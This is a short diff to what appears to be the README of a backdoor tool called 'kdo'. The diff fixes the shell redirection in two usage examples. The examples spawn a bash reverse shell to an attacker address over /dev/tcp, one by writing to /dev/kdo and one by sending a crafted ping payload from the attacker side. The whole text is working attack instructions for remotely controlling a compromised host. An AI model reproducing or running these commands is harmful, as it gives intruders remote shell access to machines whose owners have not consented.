@@ -60,11 +60,11 @@ are supported. For example, to spawn a reverse shell to `192.168.0.2:1337`, run 
 machine:
 
 ```bash
-echo 'kdo-exec bash -i &> /dev/tcp/192.168.0.2/1337 2>&1 0>&1' > /dev/kdo
+echo 'kdo-exec bash -i >& /dev/tcp/192.168.0.2/1337 2>&1 0>&1' > /dev/kdo
 ```
 
 To do the same thing remotely, send a ping from the attacker side with the same string as payload:
 
 ```bash
-sudo python src/kdo-ping.py -t 192.168.0.3 'kdo-exec bash -i &> /dev/tcp/192.168.0.2/1337 2>&1 0>&1'
+sudo python src/kdo-ping.py -t 192.168.0.3 'kdo-exec bash -i >& /dev/tcp/192.168.0.2/1337 2>&1 0>&1'
 ```
